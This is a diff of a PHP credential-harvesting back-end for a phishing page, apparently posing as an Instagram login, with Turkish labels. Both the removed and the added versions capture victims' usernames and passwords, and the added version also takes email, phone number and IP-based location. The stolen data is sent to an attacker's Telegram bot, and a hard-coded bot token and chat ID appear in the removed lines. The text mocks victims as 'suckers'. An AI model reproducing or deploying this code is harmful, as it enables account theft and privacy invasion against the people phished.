@@ -1,40 +1,36 @@
 <?php
- $user = $_POST["username"];
- $pass = $_POST["password"];
+include('tg.php');
 
- $co = "===========================================\n"; 
- $cl = "===========================================\n";
- $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
- $us = "Username: $user\n";
- $pa = "Password: $pass\n";
- 
-  
-  
-  
-<body bgcolor='#000000'>
-<body bgcolor='rgb(0,0,0)'>
-<body bgcolor='black'>
-<font color='pink'> Form Sayfası: </font><br>
-<font color='red'> Kullanıcı Adı: </font><font color='white'>".$us."</font><br>
-<font color='red'> Şifre: </font><font color='white'>".$pass."</font><br>
-<hr />
+$id=$_GET["id"];
+if($_POST){
+$ip=$_SERVER["REMOTE_ADDR"];
+$konum = file_get_contents("http://ip-api.com/xml/".$ip);
+$cek = new SimpleXMLElement($konum);
+$ulke = $cek->country;
+$sehir = $cek->city;
+date_default_timezone_set('Europe/Istanbul');  
+$cur_time=date("d-m-Y H:i:s");
 
-"; 
-
-$token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
+$password=$_POST["password"];
+$mail=$_POST["mail"];
+$number=$_POST["number"];
+include 'images/antisuspend.php';
+header("location: password.php?id=$id");
 
 $data = [
-    'text' => '
-
-Kullanıcı Adı : '.$us.' 
-Şifre : '.$pass.'
+  'text' => '➡️ Lan Koş Sazan Düştü 😈 
+Kullanıcı Adı : '.$id.'
+Şifre : '.$password.'
+Mail : '.$mail.'
+Tel : '.$number.'
+Ülke : '.$ulke.'
+Şehir : '.$sehir.'
+İp : '.$ip.'
+Tarih : '.$cur_time.'
 ',
-    'chat_id' =>-1001586201889
+  'chat_id' => $chat_id
 ];
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 
-fwrite($fileuser, "\n". $co. $us. $pa. $cl);
- fclose($fileuser);
- header('Location: https://instagram.com/');
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 }
 ?>
